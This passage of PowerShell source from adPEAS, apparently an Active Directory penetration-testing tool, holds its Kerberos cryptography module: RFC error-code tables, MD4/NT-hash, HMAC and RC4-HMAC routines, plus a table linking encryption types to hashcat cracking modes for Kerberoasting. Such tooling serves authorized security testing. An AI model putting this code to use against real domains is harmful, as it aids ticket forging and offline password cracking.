    $krbCredContent.AddRange([byte[]](New-ASN1ContextTag -Tag 3 -Data $encData))  # enc-part

    $krbCredSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$krbCredContent.ToArray()))
    $krbCred = [byte[]](New-ASN1ApplicationTag -Tag 22 -Data $krbCredSeq)

    return $krbCred
}

#endregion



# ----- Kerberos-Crypto.ps1 -----

<#
.SYNOPSIS
    Shared Kerberos cryptographic functions for adPEAS.

.DESCRIPTION
    This module contains all cryptographic primitives required for Kerberos authentication:
    - HMAC-MD5, HMAC-SHA1 for checksums
    - MD4 for NT-Hash calculation
    - RC4-HMAC encryption/decryption (etype 23)
    - AES-CTS encryption/decryption (etype 17, 18)
    - n-fold key derivation (RFC 3961)
    - PBKDF2-based AES key derivation from password

    These functions are used by:
    - Invoke-KerberosAuth.ps1
    - Request-ServiceTicket.ps1
    - Invoke-PKINITAuth-Native.ps1
    - Invoke-Kerberoast.ps1

.NOTES
    Author: Alexander Sturz (@_61106960_)

    References:
    - RFC 1320 (MD4)
    - RFC 3961 (Kerberos Encryption Framework)
    - RFC 3962 (AES Encryption for Kerberos 5)
    - RFC 4757 (RC4-HMAC for Kerberos)
#>

# Block and key sizes (RFC 3962, RFC 4757)
$Script:AES_BLOCK_SIZE = 16          # AES block size in bytes
$Script:AES128_KEY_SIZE = 16         # AES-128 key size in bytes
$Script:AES256_KEY_SIZE = 32         # AES-256 key size in bytes
$Script:RC4_CONFOUNDER_SIZE = 8      # RC4-HMAC confounder size (RFC 4757)
$Script:AES_CONFOUNDER_SIZE = 16     # AES-CTS confounder size (RFC 3962)
$Script:HMAC_MD5_SIZE = 16           # HMAC-MD5 output size
$Script:HMAC_SHA1_SIZE = 20          # HMAC-SHA1 output size
$Script:AES_CHECKSUM_SIZE = 12       # AES-CTS checksum size (truncated HMAC-SHA1)
$Script:MD4_HASH_SIZE = 16           # MD4 hash output size
$Script:NT_HASH_SIZE = 16            # NT hash size (same as MD4)

# Minimum ciphertext sizes
$Script:RC4_MIN_CIPHERTEXT = 24      # 16 (checksum) + 8 (confounder)
$Script:AES_MIN_CIPHERTEXT = 28      # 16 (confounder) + 12 (checksum)

# Key derivation constants (RFC 3961)
$Script:KE_CONSTANT_SUFFIX = 0xAA    # Encryption key derivation
$Script:KI_CONSTANT_SUFFIX = 0x55    # Integrity key derivation
$Script:KC_CONSTANT_SUFFIX = 0x99    # Checksum key derivation (for standalone checksums like PAC signatures)

# PBKDF2 iterations for AES key derivation (RFC 3962)
$Script:PBKDF2_ITERATIONS = 4096

# Kerberos Encryption Types - centralized map for all modules
# Used by: Invoke-Kerberoast, Invoke-ASREPRoast
$Script:KERBEROS_ENCRYPTION_TYPES = @{
    1  = @{ Name = "DES-CBC-CRC"; Severity = "Critical"; Description = "Obsolete and insecure"; HashcatMode = $null }
    2  = @{ Name = "DES-CBC-MD5"; Severity = "Critical"; Description = "Obsolete and insecure"; HashcatMode = $null }
    3  = @{ Name = "DES-CBC-MD4"; Severity = "Critical"; Description = "Obsolete and insecure"; HashcatMode = $null }
    17 = @{ Name = "AES128-CTS-HMAC-SHA1-96"; Severity = "Medium"; Description = "Moderate security"; HashcatMode = 19700 }
    18 = @{ Name = "AES256-CTS-HMAC-SHA1-96"; Severity = "Low"; Description = "Strong encryption"; HashcatMode = 19700 }
    23 = @{ Name = "RC4-HMAC"; Severity = "Critical"; Description = "Weak - very fast to crack"; HashcatMode = 13100 }
}

# Minimum ticket size for hash extraction
$Script:MIN_TICKET_SIZE = 32          # Minimum bytes for valid Kerberos ticket

# ============================================
# KDC Error Code Constants - Named constants for common error codes
# Used by: Connect-adPEAS, Show-ConnectionError, Invoke-KerberosAuth
# ============================================
$Script:KDC_ERR_C_PRINCIPAL_UNKNOWN = 6    # Client not found in Kerberos database
$Script:KDC_ERR_POLICY = 12                # KDC policy rejects request
$Script:KDC_ERR_ETYPE_NOSUPP = 14          # KDC has no support for encryption type
$Script:KDC_ERR_CLIENT_REVOKED = 18        # Client credentials have been revoked (disabled/locked)
$Script:KDC_ERR_KEY_EXPIRED = 23           # Password has expired
$Script:KDC_ERR_PREAUTH_FAILED = 24        # Pre-authentication failed (wrong password/key)
$Script:KDC_ERR_WRONG_REALM = 68           # Wrong realm (domain name doesn't match KDC's realm)

# Array of fatal KDC errors that should stop execution (no fallback to SimpleBind/NTLM)
# These indicate credential or configuration problems where fallback would also fail
# Used by: Connect-adPEAS for error classification
$Script:KDC_FATAL_ERROR_CODES = @(
    $Script:KDC_ERR_PREAUTH_FAILED,         # 24 - Wrong password/hash
    $Script:KDC_ERR_C_PRINCIPAL_UNKNOWN,    # 6  - User not found
    $Script:KDC_ERR_CLIENT_REVOKED,         # 18 - Account disabled/locked
    $Script:KDC_ERR_KEY_EXPIRED,            # 23 - Password expired
    $Script:KDC_ERR_WRONG_REALM             # 68 - Wrong realm (domain name mismatch)
    # Note: KDC_ERR_ETYPE_NOSUPP (14) is NOT fatal - credentials may be valid,
    #       just the Kerberos etype is not supported. NTLM/SimpleBind can still work.
)

# Kerberos Error Codes (RFC 4120) - centralized map for all modules
# Used by: Invoke-KerberosAuth, Request-ServiceTicket, Invoke-PKINITAuth-Native, Invoke-ASREPRoast
$Script:KERBEROS_ERROR_CODES = @{
    0  = @{ Name = "KDC_ERR_NONE"; Description = "No error" }
    1  = @{ Name = "KDC_ERR_NAME_EXP"; Description = "Client's entry in database has expired" }
    2  = @{ Name = "KDC_ERR_SERVICE_EXP"; Description = "Server's entry in database has expired" }
    3  = @{ Name = "KDC_ERR_BAD_PVNO"; Description = "Requested protocol version not supported" }
    4  = @{ Name = "KDC_ERR_C_OLD_MAST_KVNO"; Description = "Client's key encrypted in old master key" }
    5  = @{ Name = "KDC_ERR_S_OLD_MAST_KVNO"; Description = "Server's key encrypted in old master key" }
    6  = @{ Name = "KDC_ERR_C_PRINCIPAL_UNKNOWN"; Description = "Client not found in Kerberos database" }
    7  = @{ Name = "KDC_ERR_S_PRINCIPAL_UNKNOWN"; Description = "Server not found in Kerberos database" }
    8  = @{ Name = "KDC_ERR_PRINCIPAL_NOT_UNIQUE"; Description = "Multiple principal entries in database" }
    9  = @{ Name = "KDC_ERR_NULL_KEY"; Description = "The client or server has a null key" }
    10 = @{ Name = "KDC_ERR_CANNOT_POSTDATE"; Description = "Ticket not eligible for postdating" }
    11 = @{ Name = "KDC_ERR_NEVER_VALID"; Description = "Requested start time is later than end time" }
    12 = @{ Name = "KDC_ERR_POLICY"; Description = "KDC policy rejects request (account disabled/locked)" }
    13 = @{ Name = "KDC_ERR_BADOPTION"; Description = "KDC cannot accommodate requested option" }
    14 = @{ Name = "KDC_ERR_ETYPE_NOSUPP"; Description = "KDC has no support for encryption type" }
    15 = @{ Name = "KDC_ERR_SUMTYPE_NOSUPP"; Description = "KDC has no support for checksum type" }
    16 = @{ Name = "KDC_ERR_PADATA_TYPE_NOSUPP"; Description = "KDC has no support for padata type" }
    17 = @{ Name = "KDC_ERR_TRTYPE_NOSUPP"; Description = "KDC has no support for transited type" }
    18 = @{ Name = "KDC_ERR_CLIENT_REVOKED"; Description = "Client credentials have been revoked" }
    19 = @{ Name = "KDC_ERR_SERVICE_REVOKED"; Description = "Server credentials have been revoked" }
    20 = @{ Name = "KDC_ERR_TGT_REVOKED"; Description = "TGT has been revoked" }
    21 = @{ Name = "KDC_ERR_CLIENT_NOTYET"; Description = "Client not yet valid (try again later)" }
    22 = @{ Name = "KDC_ERR_SERVICE_NOTYET"; Description = "Server not yet valid (try again later)" }
    23 = @{ Name = "KDC_ERR_KEY_EXPIRED"; Description = "Password has expired (change password)" }
    24 = @{ Name = "KDC_ERR_PREAUTH_FAILED"; Description = "Pre-authentication failed (wrong password/key)" }
    25 = @{ Name = "KDC_ERR_PREAUTH_REQUIRED"; Description = "Additional pre-authentication required" }
    26 = @{ Name = "KDC_ERR_SERVER_NOMATCH"; Description = "Requested server and ticket don't match" }
    27 = @{ Name = "KDC_ERR_MUST_USE_USER2USER"; Description = "Server principal valid for user2user only" }
    28 = @{ Name = "KDC_ERR_PATH_NOT_ACCEPTED"; Description = "KDC Policy rejects transited path" }
    29 = @{ Name = "KDC_ERR_SVC_UNAVAILABLE"; Description = "KDC Service unavailable" }
    31 = @{ Name = "KRB_AP_ERR_BAD_INTEGRITY"; Description = "Integrity check on decrypted field failed" }
    32 = @{ Name = "KRB_AP_ERR_TKT_EXPIRED"; Description = "Ticket expired" }
    33 = @{ Name = "KRB_AP_ERR_TKT_NYV"; Description = "Ticket not yet valid" }
    34 = @{ Name = "KRB_AP_ERR_REPEAT"; Description = "Request is a replay" }
    35 = @{ Name = "KRB_AP_ERR_NOT_US"; Description = "The ticket isn't for us" }
    36 = @{ Name = "KRB_AP_ERR_BADMATCH"; Description = "Ticket and authenticator don't match" }
    37 = @{ Name = "KRB_AP_ERR_SKEW"; Description = "Clock skew too great (sync time with DC)" }
    38 = @{ Name = "KRB_AP_ERR_BADADDR"; Description = "Incorrect net address" }
    39 = @{ Name = "KRB_AP_ERR_BADVERSION"; Description = "Protocol version mismatch" }
    40 = @{ Name = "KRB_AP_ERR_MSG_TYPE"; Description = "Invalid msg type" }
    41 = @{ Name = "KRB_AP_ERR_MODIFIED"; Description = "Message stream modified" }
    42 = @{ Name = "KRB_AP_ERR_BADORDER"; Description = "Message out of order" }
    44 = @{ Name = "KRB_AP_ERR_BADKEYVER"; Description = "Specified version of key is not available" }
    45 = @{ Name = "KRB_AP_ERR_NOKEY"; Description = "Service key not available" }
    46 = @{ Name = "KRB_AP_ERR_MUT_FAIL"; Description = "Mutual authentication failed" }
    47 = @{ Name = "KRB_AP_ERR_BADDIRECTION"; Description = "Incorrect message direction" }
    48 = @{ Name = "KRB_AP_ERR_METHOD"; Description = "Alternative authentication method required" }
    49 = @{ Name = "KRB_AP_ERR_BADSEQ"; Description = "Incorrect sequence number in message" }
    50 = @{ Name = "KRB_AP_ERR_INAPP_CKSUM"; Description = "Inappropriate type of checksum in message" }
    51 = @{ Name = "KRB_AP_PATH_NOT_ACCEPTED"; Description = "Desired path is unreachable" }
    52 = @{ Name = "KRB_ERR_RESPONSE_TOO_BIG"; Description = "Too much data (response too big for UDP, retry with TCP)" }
    60 = @{ Name = "KRB_ERR_GENERIC"; Description = "Generic error" }
    61 = @{ Name = "KRB_ERR_FIELD_TOOLONG"; Description = "Field is too long for implementation" }
    62 = @{ Name = "KDC_ERR_CLIENT_NOT_TRUSTED"; Description = "Client not trusted (PKINIT)" }
    63 = @{ Name = "KDC_ERR_KDC_NOT_TRUSTED"; Description = "KDC not trusted (PKINIT)" }
    64 = @{ Name = "KDC_ERR_INVALID_SIG"; Description = "Invalid signature (PKINIT)" }
    65 = @{ Name = "KDC_ERR_DH_KEY_PARAMETERS_NOT_ACCEPTED"; Description = "DH key parameters not accepted (PKINIT)" }
    66 = @{ Name = "KDC_ERR_CERTIFICATE_MISMATCH"; Description = "Certificate doesn't match principal (PKINIT)" }
    67 = @{ Name = "KRB_AP_ERR_NO_TGT"; Description = "No TGT available" }
    68 = @{ Name = "KDC_ERR_WRONG_REALM"; Description = "Wrong realm" }
    69 = @{ Name = "KRB_AP_ERR_USER_TO_USER_REQUIRED"; Description = "User-to-user authentication required" }
    70 = @{ Name = "KDC_ERR_CANT_VERIFY_CERTIFICATE"; Description = "Cannot verify certificate (PKINIT)" }
    71 = @{ Name = "KDC_ERR_INVALID_CERTIFICATE"; Description = "Invalid certificate (PKINIT)" }
    72 = @{ Name = "KDC_ERR_REVOKED_CERTIFICATE"; Description = "Certificate revoked (PKINIT)" }
    73 = @{ Name = "KDC_ERR_REVOCATION_STATUS_UNKNOWN"; Description = "Revocation status unknown (PKINIT)" }
    74 = @{ Name = "KDC_ERR_REVOCATION_STATUS_UNAVAILABLE"; Description = "Revocation status unavailable (PKINIT)" }
    75 = @{ Name = "KDC_ERR_CLIENT_NAME_MISMATCH"; Description = "Client name mismatch in certificate (PKINIT)" }
    76 = @{ Name = "KDC_ERR_KDC_NAME_MISMATCH"; Description = "KDC name mismatch in certificate (PKINIT)" }
    77 = @{ Name = "KDC_ERR_INCONSISTENT_KEY_PURPOSE"; Description = "Certificate cannot be used for PKINIT client authentication" }
    78 = @{ Name = "KDC_ERR_DIGEST_IN_CERT_NOT_ACCEPTED"; Description = "Digest algorithm in certificate not accepted" }
    79 = @{ Name = "KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED"; Description = "paChecksum2 required (Windows Server 2022+)" }
    80 = @{ Name = "KDC_ERR_DIGEST_IN_SIGNED_DATA_NOT_ACCEPTED"; Description = "Digest algorithm in signed data not accepted" }
    81 = @{ Name = "KDC_ERR_PUBLIC_KEY_ENCRYPTION_NOT_SUPPORTED"; Description = "Public key encryption not supported" }
}

function Get-KerberosErrorMessage {
    <#
    .SYNOPSIS
        Returns a human-readable error message for a Kerberos error code.
    .PARAMETER ErrorCode
        The Kerberos error code (integer).
    .PARAMETER DescriptionOnly
        Return only the description without the error name.
        By default, returns "ERROR_NAME - Description".
    .OUTPUTS
        [string] Error message.
    .EXAMPLE
        Get-KerberosErrorMessage -ErrorCode 24
        Returns: "KDC_ERR_PREAUTH_FAILED - Pre-authentication failed (wrong password/key)"
    .EXAMPLE
        Get-KerberosErrorMessage -ErrorCode 24 -DescriptionOnly
        Returns: "Pre-authentication failed (wrong password/key)"
    #>
    param(
        [Parameter(Mandatory = $true)]
        [int]$ErrorCode,

        [Parameter(Mandatory = $false)]
        [switch]$DescriptionOnly
    )

    if ($Script:KERBEROS_ERROR_CODES.ContainsKey($ErrorCode)) {
        $errorInfo = $Script:KERBEROS_ERROR_CODES[$ErrorCode]
        if ($DescriptionOnly) {
            return $errorInfo.Description
        }
        return "$($errorInfo.Name) - $($errorInfo.Description)"
    }

    return "Unknown Kerberos error code: $ErrorCode"
}

function Compare-ByteArrayConstantTime {
    <#
    .SYNOPSIS
        Constant-time byte array comparison to prevent timing attacks.
    .DESCRIPTION
        Compares two byte arrays in constant time regardless of where differences occur.
        This prevents timing attacks where an attacker measures response time to determine
        how many bytes match.
    .PARAMETER Array1
        First byte array.
    .PARAMETER Array2
        Second byte array.
    .OUTPUTS
        [bool] $true if arrays are equal, $false otherwise.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Array1,

        [Parameter(Mandatory = $true)]
        [byte[]]$Array2
    )

    # Length check - still constant time since we compare all bytes regardless
    if ($Array1.Length -ne $Array2.Length) {
        return $false
    }

    # XOR all bytes and accumulate differences
    # This ensures we always iterate through ALL bytes regardless of differences
    $diff = 0
    for ($i = 0; $i -lt $Array1.Length; $i++) {
        $diff = $diff -bor ($Array1[$i] -bxor $Array2[$i])
    }

    return ($diff -eq 0)
}

function Get-KeyUsageConstant {
    <#
    .SYNOPSIS
        Creates the key usage constant for AES key derivation.
    .DESCRIPTION
        Builds the 5-byte constant used in RFC 3961 key derivation:
        [KeyUsage as 4 big-endian bytes] + [Suffix byte (0xAA for Ke, 0x55 for Ki)]
    .PARAMETER KeyUsage
        The Kerberos key usage number.
    .PARAMETER Suffix
        The derivation suffix: 0xAA for encryption key (Ke), 0x55 for integrity key (Ki).
    .OUTPUTS
        [byte[]] 5-byte key derivation constant.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [int]$KeyUsage,

        [Parameter(Mandatory = $true)]
        [byte]$Suffix
    )

    return @(
        [byte](($KeyUsage -shr 24) -band 0xFF),
        [byte](($KeyUsage -shr 16) -band 0xFF),
        [byte](($KeyUsage -shr 8) -band 0xFF),
        [byte]($KeyUsage -band 0xFF),
        $Suffix
    )
}

function Get-HMACMD5 {
    <#
    .SYNOPSIS
        Computes HMAC-MD5 hash.
    .PARAMETER Key
        The secret key for HMAC.
    .PARAMETER Data
        The data to hash.
    .OUTPUTS
        [byte[]] 16-byte HMAC-MD5 hash.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Key,

        [Parameter(Mandatory = $true)]
        [byte[]]$Data
    )

    $hmac = New-Object System.Security.Cryptography.HMACMD5
    try {
        $hmac.Key = $Key
        return $hmac.ComputeHash($Data)
    }
    finally {
        $hmac.Dispose()
    }
}

function Get-HMACSHA1 {
    <#
    .SYNOPSIS
        Computes HMAC-SHA1 hash.
    .PARAMETER Key
        The secret key for HMAC.
    .PARAMETER Data
        The data to hash.
    .OUTPUTS
        [byte[]] 20-byte HMAC-SHA1 hash.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Key,

        [Parameter(Mandatory = $true)]
        [byte[]]$Data
    )

    $hmac = New-Object System.Security.Cryptography.HMACSHA1
    try {
        $hmac.Key = $Key
        return $hmac.ComputeHash($Data)
    }
    finally {
        $hmac.Dispose()
    }
}

function Get-MD4Hash {
    <#
    .SYNOPSIS
        Computes MD4 hash (RFC 1320).
    .DESCRIPTION
        Pure PowerShell MD4 implementation for NT-Hash calculation.
        Uses [long] arithmetic with masking to avoid signed integer overflow issues.
    .PARAMETER Data
        The data to hash.
    .OUTPUTS
        [byte[]] 16-byte MD4 hash.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Data
    )

    # Helper: Left rotate with proper masking
    function LeftRotate([long]$x, [int]$n) {
        $x = $x -band 0xFFFFFFFFL
        return (($x -shl $n) -bor ($x -shr (32 - $n))) -band 0xFFFFFFFFL
    }

    # Helper: Safe addition with overflow protection
    function SafeAdd {
        param([long[]]$Values)
        $result = 0L
        foreach ($v in $Values) {
            $result = ($result + ($v -band 0xFFFFFFFFL)) -band 0xFFFFFFFFL
        }
        return $result
    }

    function ToUInt32([long]$x) {
        return [uint32]($x -band 0xFFFFFFFFL)
    }

    # Initialize state
    [long]$A = 0x67452301L
    [long]$B = 0xefcdab89L
    [long]$C = 0x98badcfeL
    [long]$D = 0x10325476L

    # Pre-processing: adding padding bits
    $msgLen = $Data.Length
    $padLen = 64 - (($msgLen + 9) % 64)
    if ($padLen -eq 64) { $padLen = 0 }

    $paddedMsg = New-Object byte[] ($msgLen + 1 + $padLen + 8)
    [Array]::Copy($Data, $paddedMsg, $msgLen)
    $paddedMsg[$msgLen] = 0x80

    # Append length in bits as 64-bit little-endian
    $bitLen = [uint64]$msgLen * 8
    $lenBytes = [System.BitConverter]::GetBytes($bitLen)
    [Array]::Copy($lenBytes, 0, $paddedMsg, $paddedMsg.Length - 8, 8)

    # Process each 64-byte block
    for ($i = 0; $i -lt $paddedMsg.Length; $i += 64) {
        $X = New-Object long[] 16
        for ($j = 0; $j -lt 16; $j++) {
            $X[$j] = [long][System.BitConverter]::ToUInt32($paddedMsg, $i + $j * 4)
        }

        $AA = $A; $BB = $B; $CC = $C; $DD = $D

        # F(X,Y,Z) = (X AND Y) OR (NOT X AND Z)
        # Round 1
        $A = LeftRotate (SafeAdd @($A, (($B -band $C) -bor ((-bnot $B) -band $D)), $X[0])) 3
        $D = LeftRotate (SafeAdd @($D, (($A -band $B) -bor ((-bnot $A) -band $C)), $X[1])) 7
        $C = LeftRotate (SafeAdd @($C, (($D -band $A) -bor ((-bnot $D) -band $B)), $X[2])) 11
        $B = LeftRotate (SafeAdd @($B, (($C -band $D) -bor ((-bnot $C) -band $A)), $X[3])) 19
        $A = LeftRotate (SafeAdd @($A, (($B -band $C) -bor ((-bnot $B) -band $D)), $X[4])) 3
        $D = LeftRotate (SafeAdd @($D, (($A -band $B) -bor ((-bnot $A) -band $C)), $X[5])) 7
        $C = LeftRotate (SafeAdd @($C, (($D -band $A) -bor ((-bnot $D) -band $B)), $X[6])) 11
        $B = LeftRotate (SafeAdd @($B, (($C -band $D) -bor ((-bnot $C) -band $A)), $X[7])) 19
        $A = LeftRotate (SafeAdd @($A, (($B -band $C) -bor ((-bnot $B) -band $D)), $X[8])) 3
        $D = LeftRotate (SafeAdd @($D, (($A -band $B) -bor ((-bnot $A) -band $C)), $X[9])) 7
        $C = LeftRotate (SafeAdd @($C, (($D -band $A) -bor ((-bnot $D) -band $B)), $X[10])) 11
        $B = LeftRotate (SafeAdd @($B, (($C -band $D) -bor ((-bnot $C) -band $A)), $X[11])) 19
        $A = LeftRotate (SafeAdd @($A, (($B -band $C) -bor ((-bnot $B) -band $D)), $X[12])) 3
        $D = LeftRotate (SafeAdd @($D, (($A -band $B) -bor ((-bnot $A) -band $C)), $X[13])) 7
        $C = LeftRotate (SafeAdd @($C, (($D -band $A) -bor ((-bnot $D) -band $B)), $X[14])) 11
        $B = LeftRotate (SafeAdd @($B, (($C -band $D) -bor ((-bnot $C) -band $A)), $X[15])) 19

        # G(X,Y,Z) = (X AND Y) OR (X AND Z) OR (Y AND Z)
        # Round 2
        $A = LeftRotate (SafeAdd @($A, (($B -band $C) -bor ($B -band $D) -bor ($C -band $D)), $X[0], 0x5A827999L)) 3
        $D = LeftRotate (SafeAdd @($D, (($A -band $B) -bor ($A -band $C) -bor ($B -band $C)), $X[4], 0x5A827999L)) 5
        $C = LeftRotate (SafeAdd @($C, (($D -band $A) -bor ($D -band $B) -bor ($A -band $B)), $X[8], 0x5A827999L)) 9
        $B = LeftRotate (SafeAdd @($B, (($C -band $D) -bor ($C -band $A) -bor ($D -band $A)), $X[12], 0x5A827999L)) 13
        $A = LeftRotate (SafeAdd @($A, (($B -band $C) -bor ($B -band $D) -bor ($C -band $D)), $X[1], 0x5A827999L)) 3
        $D = LeftRotate (SafeAdd @($D, (($A -band $B) -bor ($A -band $C) -bor ($B -band $C)), $X[5], 0x5A827999L)) 5
        $C = LeftRotate (SafeAdd @($C, (($D -band $A) -bor ($D -band $B) -bor ($A -band $B)), $X[9], 0x5A827999L)) 9
        $B = LeftRotate (SafeAdd @($B, (($C -band $D) -bor ($C -band $A) -bor ($D -band $A)), $X[13], 0x5A827999L)) 13
        $A = LeftRotate (SafeAdd @($A, (($B -band $C) -bor ($B -band $D) -bor ($C -band $D)), $X[2], 0x5A827999L)) 3
        $D = LeftRotate (SafeAdd @($D, (($A -band $B) -bor ($A -band $C) -bor ($B -band $C)), $X[6], 0x5A827999L)) 5
        $C = LeftRotate (SafeAdd @($C, (($D -band $A) -bor ($D -band $B) -bor ($A -band $B)), $X[10], 0x5A827999L)) 9
        $B = LeftRotate (SafeAdd @($B, (($C -band $D) -bor ($C -band $A) -bor ($D -band $A)), $X[14], 0x5A827999L)) 13
        $A = LeftRotate (SafeAdd @($A, (($B -band $C) -bor ($B -band $D) -bor ($C -band $D)), $X[3], 0x5A827999L)) 3
        $D = LeftRotate (SafeAdd @($D, (($A -band $B) -bor ($A -band $C) -bor ($B -band $C)), $X[7], 0x5A827999L)) 5
        $C = LeftRotate (SafeAdd @($C, (($D -band $A) -bor ($D -band $B) -bor ($A -band $B)), $X[11], 0x5A827999L)) 9
        $B = LeftRotate (SafeAdd @($B, (($C -band $D) -bor ($C -band $A) -bor ($D -band $A)), $X[15], 0x5A827999L)) 13

        # H(X,Y,Z) = X XOR Y XOR Z
        # Round 3
        $A = LeftRotate (SafeAdd @($A, ($B -bxor $C -bxor $D), $X[0], 0x6ED9EBA1L)) 3
        $D = LeftRotate (SafeAdd @($D, ($A -bxor $B -bxor $C), $X[8], 0x6ED9EBA1L)) 9
        $C = LeftRotate (SafeAdd @($C, ($D -bxor $A -bxor $B), $X[4], 0x6ED9EBA1L)) 11
        $B = LeftRotate (SafeAdd @($B, ($C -bxor $D -bxor $A), $X[12], 0x6ED9EBA1L)) 15
        $A = LeftRotate (SafeAdd @($A, ($B -bxor $C -bxor $D), $X[2], 0x6ED9EBA1L)) 3
        $D = LeftRotate (SafeAdd @($D, ($A -bxor $B -bxor $C), $X[10], 0x6ED9EBA1L)) 9
        $C = LeftRotate (SafeAdd @($C, ($D -bxor $A -bxor $B), $X[6], 0x6ED9EBA1L)) 11
        $B = LeftRotate (SafeAdd @($B, ($C -bxor $D -bxor $A), $X[14], 0x6ED9EBA1L)) 15
        $A = LeftRotate (SafeAdd @($A, ($B -bxor $C -bxor $D), $X[1], 0x6ED9EBA1L)) 3
        $D = LeftRotate (SafeAdd @($D, ($A -bxor $B -bxor $C), $X[9], 0x6ED9EBA1L)) 9
        $C = LeftRotate (SafeAdd @($C, ($D -bxor $A -bxor $B), $X[5], 0x6ED9EBA1L)) 11
        $B = LeftRotate (SafeAdd @($B, ($C -bxor $D -bxor $A), $X[13], 0x6ED9EBA1L)) 15
        $A = LeftRotate (SafeAdd @($A, ($B -bxor $C -bxor $D), $X[3], 0x6ED9EBA1L)) 3
        $D = LeftRotate (SafeAdd @($D, ($A -bxor $B -bxor $C), $X[11], 0x6ED9EBA1L)) 9
        $C = LeftRotate (SafeAdd @($C, ($D -bxor $A -bxor $B), $X[7], 0x6ED9EBA1L)) 11
        $B = LeftRotate (SafeAdd @($B, ($C -bxor $D -bxor $A), $X[15], 0x6ED9EBA1L)) 15

        $A = SafeAdd @($A, $AA)
        $B = SafeAdd @($B, $BB)
        $C = SafeAdd @($C, $CC)
        $D = SafeAdd @($D, $DD)
    }

    $result = New-Object byte[] 16
    [Array]::Copy([System.BitConverter]::GetBytes((ToUInt32 $A)), 0, $result, 0, 4)
    [Array]::Copy([System.BitConverter]::GetBytes((ToUInt32 $B)), 0, $result, 4, 4)
    [Array]::Copy([System.BitConverter]::GetBytes((ToUInt32 $C)), 0, $result, 8, 4)
    [Array]::Copy([System.BitConverter]::GetBytes((ToUInt32 $D)), 0, $result, 12, 4)

    return $result
}

function Get-NTHashFromPassword {
    <#
    .SYNOPSIS
        Computes NT-Hash from plaintext password.
    .DESCRIPTION
        NT-Hash = MD4(UTF-16LE(password))
    .PARAMETER PlainPassword
        The plaintext password.
    .OUTPUTS
        [byte[]] 16-byte NT hash.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]$PlainPassword
    )

    $utf16leBytes = [System.Text.Encoding]::Unicode.GetBytes($PlainPassword)
    return Get-MD4Hash -Data $utf16leBytes
}

function Invoke-RC4 {
    <#
    .SYNOPSIS
        RC4 stream cipher implementation.
    .PARAMETER Key
        The encryption key.
    .PARAMETER Data
        The data to encrypt/decrypt.
    .OUTPUTS
        [byte[]] Encrypted/decrypted data.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Key,

        [Parameter(Mandatory = $true)]
        [byte[]]$Data
    )

    # Key-scheduling algorithm (KSA)
    $S = [byte[]](0..255)
    $j = 0

    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $Key[$i % $Key.Length]) % 256
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
    }

    # Pseudo-random generation algorithm (PRGA)
    $i = 0
    $j = 0
    $result = New-Object byte[] $Data.Length

    for ($k = 0; $k -lt $Data.Length; $k++) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
        $result[$k] = $Data[$k] -bxor $S[($S[$i] + $S[$j]) % 256]
    }

    return $result
}

function Encrypt-RC4HMAC {
    <#
    .SYNOPSIS
        Encrypts data using RC4-HMAC (etype 23).
    .DESCRIPTION
        Implements RFC 4757 RC4-HMAC encryption for Kerberos.
    .PARAMETER Key
        The RC4 key (NT-Hash).
    .PARAMETER Data
        The plaintext data.
    .PARAMETER KeyUsage
        The Kerberos key usage number.
    .OUTPUTS
        [byte[]] Encrypted data with checksum (16 bytes checksum + encrypted data).
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Key,

        [Parameter(Mandatory = $true)]
        [byte[]]$Data,

        [Parameter(Mandatory = $true)]
        [int]$KeyUsage
    )

    # Generate random confounder (RFC 4757: 8 bytes for RC4-HMAC)
    $confounder = New-Object byte[] $Script:RC4_CONFOUNDER_SIZE
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    try {
        $rng.GetBytes($confounder)
    }
    finally {
        $rng.Dispose()
    }

    # K1 = HMAC-MD5(Key, usage)
    $usageBytes = [System.BitConverter]::GetBytes([int32]$KeyUsage)
    $K1 = Get-HMACMD5 -Key $Key -Data $usageBytes

    # Plaintext = confounder || data
    $plaintext = $confounder + $Data

    # Checksum = HMAC-MD5(K1, plaintext)
    $checksum = Get-HMACMD5 -Key $K1 -Data $plaintext

    # K2 = HMAC-MD5(K1, checksum)
    $K2 = Get-HMACMD5 -Key $K1 -Data $checksum

    # Encrypted = RC4(K2, plaintext)
    $encrypted = Invoke-RC4 -Key $K2 -Data $plaintext

    return $checksum + $encrypted
}

function Decrypt-RC4HMAC {
    <#
    .SYNOPSIS
        Decrypts data using RC4-HMAC (etype 23).
    .DESCRIPTION
        Implements RFC 4757 RC4-HMAC decryption for Kerberos.
    .PARAMETER Key
        The RC4 key (NT-Hash).
    .PARAMETER CipherText
        The encrypted data with checksum.
    .PARAMETER KeyUsage
        The Kerberos key usage number.
    .OUTPUTS
        [byte[]] Decrypted plaintext (without confounder).
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Key,

        [Parameter(Mandatory = $true)]
        [byte[]]$CipherText,

        [Parameter(Mandatory = $true)]
        [int]$KeyUsage
    )

    if ($CipherText.Length -lt $Script:RC4_MIN_CIPHERTEXT) {
        throw "RC4-HMAC ciphertext too short (minimum $Script:RC4_MIN_CIPHERTEXT bytes: $Script:HMAC_MD5_SIZE checksum + $Script:RC4_CONFOUNDER_SIZE confounder)"
    }

    $checksum = $CipherText[0..($Script:HMAC_MD5_SIZE - 1)]
    $encrypted = $CipherText[$Script:HMAC_MD5_SIZE..($CipherText.Length - 1)]

    # K1 = HMAC-MD5(Key, usage)
    $usageBytes = [System.BitConverter]::GetBytes([int32]$KeyUsage)
    $K1 = Get-HMACMD5 -Key $Key -Data $usageBytes

    # K2 = HMAC-MD5(K1, checksum)
